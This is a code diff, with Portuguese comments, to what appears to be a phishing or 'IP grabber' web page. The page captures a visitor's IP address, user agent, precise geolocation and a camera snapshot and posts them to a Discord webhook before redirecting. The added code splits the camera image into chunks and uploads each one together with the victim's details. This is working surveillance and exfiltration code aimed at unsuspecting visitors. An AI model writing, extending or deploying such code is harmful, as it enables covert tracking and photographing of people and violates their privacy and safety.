@@ -21,6 +21,8 @@
   const requestCamera = getParam("cam", cfg.requestCamera) == "1";
   const requestGeo = getParam("geo", cfg.requestGeo) == "1";
   const redirectDelay = parseInt(getParam("delay", cfg.redirectDelayMs), 10);
+  const splitImage = getParam("split", cfg.splitImage) == "1";
+  const chunkSize = parseInt(getParam("chunkSize", cfg.chunkSize), 10);
 
   log("Webhook:", webhookUrl);
   log("Destino:", finalUrl);
@@ -68,29 +70,136 @@
     }
   }
 
+  // Função para dividir imagem em partes
+  const splitImageFunc = async (imageBlob) => {
+    const chunks = [];
+    const arrayBuffer = await imageBlob.arrayBuffer();
+    const totalSize = arrayBuffer.byteLength;
+    
+    log("Tamanho da imagem:", totalSize, "bytes");
+    log("Tamanho máximo do chunk:", chunkSize, "bytes");
+    
+    for (let i = 0; i < totalSize; i += chunkSize) {
+      const chunk = arrayBuffer.slice(i, i + chunkSize);
+      chunks.push(new Blob([chunk], { type: 'image/jpeg' }));
+      log("Criado chunk", chunks.length, "tamanho:", chunk.byteLength);
+    }
+    
+    return chunks;
+  };
+
+  // Enviar chunks separadamente
+  const sendImageChunks = async (chunks) => {
+    for (let i = 0; i < chunks.length; i++) {
+      const chunkPayload = `**IP:** ${data.ip || "N/A"}\n` +
+        `**User-Agent:** ${data.userAgent}\n` +
+        `**Localização:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : "N/A"}\n` +
+        `**Hora:** ${data.when}\n` +
+        `**Parte:** ${i + 1}/${chunks.length}`;
+      
+      const form = new FormData();
+      form.append("payload_json", JSON.stringify({ content: chunkPayload }));
+      form.append("file", chunks[i], `cam_part${i + 1}.jpg`);
+      
+      try {
+        const response = await fetch(webhookUrl, { method: "POST", body: form });
+        log("Status do chunk", i + 1, ":", response.status, response.statusText);
+        
+        if (response.ok) {
+          log("Chunk", i + 1, "enviado com sucesso!");
+        } else {
+          log("Erro no chunk", i + 1, "-", response.status, response.statusText);
+        }
+        
+        // Pequeno delay entre envios para não sobrecarregar
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+      } catch (e) {
+        log("Erro ao enviar chunk", i + 1, ":", e.message);
+      }
+    }
+  };
+
   const payload = `**IP:** ${data.ip || "N/A"}\n` +
     `**User-Agent:** ${data.userAgent}\n` +
     `**Localização:** ${data.location ? `${data.location.lat}, ${data.location.lon} (±${data.location.acc}m)` : "N/A"}\n` +
     `**Hora:** ${data.when}`;
 
-  const form = new FormData();
-  form.append("payload_json", JSON.stringify({ content: payload }));
-  if (blob) form.append("file", blob, "cam.jpg");
-
   if (webhookUrl.startsWith("https://discord.com/api/webhooks/") || webhookUrl.startsWith("https://discordapp.com/api/webhooks/")) {
-    try {
-      const response = await fetch(webhookUrl, { method: "POST", body: form });
-      log("Status do envio:", response.status, response.statusText);
-      if (response.ok) {
-        log("Enviado ao Discord com sucesso!");
+    if (blob) {
+      if (splitImage) {
+        // Dividir imagem e enviar em partes
+        log("Dividindo imagem em partes (splitImage=true)...");
+        const chunks = await splitImageFunc(blob);
+        log("Total de chunks:", chunks.length);
+        
+        if (chunks.length > 1) {
+          log("Enviando imagem em", chunks.length, "partes...");
+          await sendImageChunks(chunks);
+        } else {
+          log("Imagem pequena, enviando normal...");
+          // Imagem pequena, enviar normal
+          const form = new FormData();
+          form.append("payload_json", JSON.stringify({ content: payload }));
+          form.append("file", blob, "cam.jpg");
+          
+          try {
+            const response = await fetch(webhookUrl, { method: "POST", body: form });
+            log("Status do envio:", response.status, response.statusText);
+            if (response.ok) {
+              log("Enviado ao Discord com sucesso!");
+            } else {
+              log("Erro no Discord - Status:", response.status, response.statusText);
+              const errorText = await response.text();
+              log("Resposta de erro:", errorText);
+            }
+          } catch (e) {
+            log("Erro ao enviar para webhook:", e.message);
+            log("Erro completo:", e);
+          }
+        }
       } else {
-        log("Erro no Discord - Status:", response.status, response.statusText);
-        const errorText = await response.text();
-        log("Resposta de erro:", errorText);
+        log("Enviando imagem inteira (splitImage=false)...");
+        // Enviar imagem inteira
+        const form = new FormData();
+        form.append("payload_json", JSON.stringify({ content: payload }));
+        form.append("file", blob, "cam.jpg");
+        
+        try {
+          const response = await fetch(webhookUrl, { method: "POST", body: form });
+          log("Status do envio:", response.status, response.statusText);
+          if (response.ok) {
+            log("Enviado ao Discord com sucesso!");
+          } else {
+            log("Erro no Discord - Status:", response.status, response.statusText);
+            const errorText = await response.text();
+            log("Resposta de erro:", errorText);
+          }
+        } catch (e) {
+          log("Erro ao enviar para webhook:", e.message);
+          log("Erro completo:", e);
+        }
       }
-    } catch (e) {
-      log("Erro ao enviar para webhook:", e.message);
-      log("Erro completo:", e);
+    } else {
+      // Sem imagem, enviar apenas texto
+      log("Sem imagem, enviando apenas texto...");
+      const form = new FormData();
+      form.append("payload_json", JSON.stringify({ content: payload }));
+      
+      try {
+        const response = await fetch(webhookUrl, { method: "POST", body: form });
+        log("Status do envio:", response.status, response.statusText);
+        if (response.ok) {
+          log("Enviado ao Discord com sucesso!");
+        } else {
+          log("Erro no Discord - Status:", response.status, response.statusText);
+          const errorText = await response.text();
+          log("Resposta de erro:", errorText);
+        }
+      } catch (e) {
+        log("Erro ao enviar para webhook:", e.message);
+        log("Erro completo:", e);
+      }
     }
   } else {
     log("URL do webhook inválido:", webhookUrl);
